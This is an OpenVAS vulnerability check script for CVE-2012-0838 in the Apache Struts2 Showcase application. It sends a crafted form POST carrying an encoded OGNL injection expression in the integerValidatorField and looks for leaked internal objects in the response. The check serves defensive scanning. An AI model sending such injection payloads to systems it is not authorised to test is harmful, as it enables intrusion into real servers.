##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_apache_struts_showcase_java_method_exec_vuln.nasl 13659 2019-02-14 08:34:21Z cfischer $
#
# Apache Struts2 Showcase Arbitrary Java Method Execution vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:apache:struts";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802425");
  script_version("$Revision: 13659 $");
  script_cve_id("CVE-2012-0838");
  script_bugtraq_id(49728);
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"$Date: 2019-02-14 09:34:21 +0100 (Thu, 14 Feb 2019) $");
  script_tag(name:"creation_date", value:"2012-03-13 14:59:53 +0530 (Tue, 13 Mar 2012)");
  script_tag(name:"qod_type", value:"remote_vul");
  script_name("Apache Struts2 Showcase Arbitrary Java Method Execution vulnerability");

  script_tag(name:"summary", value:"This host is running Apache Struts Showcase
  and is prone to java method execution vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted HTTP GET request and
  check whether it is able execute java methods or not.");

  script_tag(name:"insight", value:"The flaw is due to an improper conversion
  in OGNL expression if a non string property is contained in action.");

  script_tag(name:"impact", value:"Successful exploitation could allow an attacker to execute arbitrary java
  method. Further that results to disclose environment variables or cause a
  denial of service or an arbitrary OS command can be executed.");

  script_tag(name:"affected", value:"Apache Struts2 (Showcase) version 2.x to 2.2.3");
  script_tag(name:"solution", value:"Upgrade to Apache Struts2  2.2.3.1 or later.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://jvn.jp/en/jp/JVN79099262/index.html");
  script_xref(name:"URL", value:"https://issues.apache.org/jira/browse/WW-3668");
  script_xref(name:"URL", value:"http://jvndb.jvn.jp/en/contents/2012/JVNDB-2012-000012.html");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_dependencies("gb_apache_struts2_detection.nasl");
  script_mandatory_keys("ApacheStruts/installed");
  script_family("Web application abuses");
  script_require_ports("Services/www", 8080);

  script_xref(name:"URL", value:"http://struts.apache.org/download.cgi");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!asport = get_app_port(cpe:CPE)){
  exit(0);
}

if(!dir = get_app_location(cpe:CPE, port:asport)){
  exit(0);
}

useragent = http_get_user_agent();
host = http_host_name(port:asport);

asreq = http_get(item:string(dir,"/showcase.action"), port:asport);
asres = http_keepalive_send_recv(port:asport, data:asreq);
if(!asres) exit(0);

if(">Showcase</" >< asres && ">Struts Showcase<" >< asres) {

  postdata = "requiredValidatorField=&requiredStringValidatorField" +
             "=&integerValidatorField=%22%3C%27+%2B+%23application" +
             "+%2B+%27%3E%22&dateValidatorField=&emailValidatorFie" +
             "ld=&urlValidatorField=&stringLengthValidatorField=&r" +
             "egexValidatorField=&fieldExpressionValidatorField=";

  url = dir + "/validation/submitFieldValidatorsExamples.action";

  asReq = string("POST ", url, " HTTP/1.1\r\n",
                 "Host: ", host, "\r\n",
                 "User-Agent: ", useragent, "\r\n",
                 "Content-Type: application/x-www-form-urlencoded\r\n",
                 "Content-Length: ", strlen(postdata), "\r\n",
                 "\r\n", postdata);
  asRes = http_keepalive_send_recv(port:asport, data:asReq);

  if( asRes && ".template.Configuration@" >< asRes && ">Struts Showcase<" >< asRes ) {
    security_message(port:asport);
    exit(0);
  }
  exit(99);
}

exit(0);